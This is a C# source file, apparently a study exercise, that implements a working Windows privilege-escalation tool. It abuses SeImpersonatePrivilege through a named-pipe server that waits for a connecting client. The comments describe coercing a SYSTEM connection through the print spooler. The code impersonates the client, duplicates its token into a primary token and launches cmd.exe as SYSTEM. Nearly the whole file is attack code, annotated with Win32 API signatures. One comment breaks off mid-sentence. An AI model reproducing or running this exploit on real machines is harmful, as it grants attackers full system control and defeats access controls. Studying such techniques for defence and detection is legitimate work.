using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Pipe_Impersonate
{
    class Program


    {

        //Import to CreateNamedPipe

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);


        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);


        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);


        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        static void Main(string[] args)
        {

            //In this attack, we will abuse the user's/Server account' SEImpersonatePrivilege. 
            // SeImpersonate Privilege allows us to impersonate any token which we can get a reference or handle to.
            //If we have the SeImpersonatePrivilege privilege, we can use the Win32 DuplicateTokenEx API to create a PRIMARY token from an
            //Impersonation token and create a new process in the context of the impersonated user.


            //We will use Pipes to try and get a reference or handle to a SYSTEM token:
            //We will leverage of the Print spooler attack
            // This attack is based of that the print spooler monitor printer object changes and sends change notifications to print client
            // by connecting to their respective named pipes.

            //The whole attack flow: Create a process running with SeImpersonatePrivilege that simulates a Print client.
            //Use the 


            //Creating the Pipe Server:
            //This simulates a server and waits for a connection and then impersonates them.
            //ImpersonateNamedPipeClient API : allows impersonate of the token from the account that connects to the pipe.

            /*
             
            HANDLE CreateNamedPipeA(
              LPCSTR                lpName,
              DWORD                 dwOpenMode,
              DWORD                 dwPipeMode,
              DWORD                 nMaxInstances,
              DWORD                 nOutBufferSize,
              DWORD                 nInBufferSize,
              DWORD                 nDefaultTimeOut,
              LPSECURITY_ATTRIBUTES lpSecurityAttributes
            );


             */

            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);


            //Connect to this named Pipe
            /*
             BOOL ConnectNamedPipe(
              HANDLE       hNamedPipe,
              LPOVERLAPPED lpOverlapped
            );
             */
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            //Once we connect to our pipe, the application will wait for any incoming pipe client.
            //Once connection made, we will call impersonateNamedpipeclient to impersonate them.

            /*
             BOOL ImpersonateNamedPipeClient(
              HANDLE hNamedPipe
            );
             */
            ImpersonateNamedPipeClient(hPipe);

            //ImpersonateNamedPipeClient will then assign the impersonated token to the current thread.


            //Verification stage (Optional Stage):

            //OpenThreadToken: (Opens the impersonated token).

            /*
             BOOL OpenThreadToken(
                  HANDLE  ThreadHandle,
                  DWORD   DesiredAccess,
                  BOOL    OpenAsSelf,
                  PHANDLE TokenHandle
                );
             */


            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);


            //GetTokenInformation: (Obtain the SID associated with the the token):

            /*
             
          BOOL OpenThreadToken(
          HANDLE  ThreadHandle,
          DWORD   DesiredAccess,
          BOOL    OpenAsSelf,
          PHANDLE TokenHandle
        );
             
                */

            int TokenInfLength = 0;

            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            //Call twice because we dont know the required size of the buffer.
            //The first call is to return the Token information length.
           
            //Allocate unmanaged memory.
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);


            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            //Finally, We will use ConvertSidToStringSid
            //This will convert the binary SID to a SID string

            /*
             BOOL ConvertSidToStringSidW(
                  PSID   Sid,
                  LPWSTR *StringSid
                );
            );
            */
            //Since the pointer to the SID is in the Output buffer (TokenInformation).
            //We will define the TOKEN_USER structure and then marshal a pointer to it.
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            //we can then use calls such as "TokenUser.User.Sid", as defined in our structs.
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            //conver the pointer to string.
            string sidstr = Marshal.PtrToStringAuto(pstr);

            //Print out the SID associated with the token; this is the user we impersonated.
            Console.WriteLine(@"Found sid {0}", sidstr);


            //once getting our SID, we can take advantage of this impersonated token and start a new CMD prompt as system:

            /*
             BOOL DuplicateTokenEx(
                  HANDLE                       hExistingToken,
                  DWORD                        dwDesiredAccess,
                  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
                  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                  TOKEN_TYPE                   TokenType,
                  PHANDLE                      phNewToken
                );
             */

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
            //With the token duplicated as a primary token, we can call CreateProcessWithToken to create a command prompt as SYSTEM.

            /*
             BOOL CreateProcessWithTokenW(
                  HANDLE                hToken,
                  DWORD                 dwLogonFlags,
                  LPCWSTR               lpApplicationName,
                  LPWSTR                lpCommandLine,
                  DWORD                 dwCreationFlags,
                  LPVOID                lpEnvironment,
                  LPCWSTR               lpCurrentDirectory,
                  LPSTARTUPINFOW        lpStartupInfo,
                  LPPROCESS_INFORMATION lpProcessInformation
                );
             */
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            // can call powersqhell string.
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);

            //we can execute anything we want here:




        }
    }
}
